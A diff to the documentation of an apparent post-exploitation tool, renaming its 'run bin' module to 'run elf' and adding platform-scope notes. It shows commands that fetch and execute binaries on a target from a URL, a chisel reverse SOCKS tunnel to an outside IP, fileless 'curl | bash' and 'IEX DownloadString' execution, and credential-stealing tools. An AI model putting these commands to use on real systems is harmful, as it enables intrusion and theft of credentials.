@@ -71,7 +71,7 @@ Post-exploitation script that grabs credentials, SSH keys, browser data, and oth
 
 **Mode:** Disk + cleanup (binary uploaded, executed, shredded after)
 **Timeout:** 5 minutes by default.
-**Note:** Uses pspy64. For 32-bit targets, use `run bin` with the pspy32 URL.
+**Note:** Uses pspy64. For 32-bit targets, use `run elf` with the pspy32 URL.
 
 ### Linux Exploit Suggester — `run linexp`
 
@@ -124,18 +124,20 @@ Windows privilege escalation scanner from [PEASS-ng](https://github.com/peass-ng
 
 **Mode:** Disk + cleanup (native binary, not .NET — must touch disk)
 **Default args:** `all` (if no args provided)
+**Current status:** Deferred on Windows in the TUI branch until a dedicated native `.exe` runner exists again.
 
-### Binary — `run bin`
+### ELF Binary — `run elf`
 
 Run any arbitrary binary from a URL or your binbag directory:
 
 ```
-󰗣 gummy [1] ❯ run bin pspy64              # From binbag
-󰗣 gummy [1] ❯ run bin https://url/tool    # From URL
-󰗣 gummy [1] ❯ run bin chisel client 10.10.14.5:8888 R:socks
+󰗣 gummy [1] ❯ run elf pspy64              # From binbag
+󰗣 gummy [1] ❯ run elf https://url/tool    # From URL
+󰗣 gummy [1] ❯ run elf chisel client 10.10.14.5:8888 R:socks
 ```
 
 **Mode:** Disk + cleanup (downloaded, executed, shredded)
+**Scope:** Linux/native Unix targets only for now. Windows native executables are not supported by this runner yet.
 
 ## Custom Modules
 
@@ -149,6 +151,7 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ```
 
 **Mode:** In-memory (`curl | bash`)
+**Scope:** Linux/native Unix targets only.
 
 ### PowerShell — `run ps1`
 
@@ -158,6 +161,7 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ```
 
 **Mode:** In-memory (`IEX DownloadString`)
+**Scope:** Windows only.
 
 ### .NET Assembly — `run dotnet`
 
@@ -168,13 +172,14 @@ These modules run arbitrary scripts/assemblies from URLs or binbag:
 ```
 
 **Mode:** In-memory (`DownloadData` + `Reflection.Assembly.Load`)
+**Scope:** Windows only.
 
 Works with any .NET assembly that has a `Main()` entry point: SharpUp, Rubeus, Seatbelt, Certify, SharpHound, SharpDPAPI, Whisker, etc.
 
 ## Current Validation Status
 
 - Linux: `peas`, `lse`, `loot`, `linexp`, and `pspy` have been tested in the current worker-session model.
-- Linux: `sh`, `bin`, and `py` still need fresh validation logs.
+- Linux: `sh` and `elf` still need fresh validation logs.
 - Windows: baseline TUI validation comes before trusting `ps1`, `dotnet`, `winpeas`, `seatbelt`, or `lazagne` in this TUI branch.
 
 ### Python — `run py`
@@ -184,6 +189,7 @@ Works with any .NET assembly that has a `Main()` entry point: SharpUp, Rubeus, S
 ```
 
 **Mode:** In-memory
+**Scope:** Linux/native Unix only for now.
 
 ## How In-Memory Execution Works
 
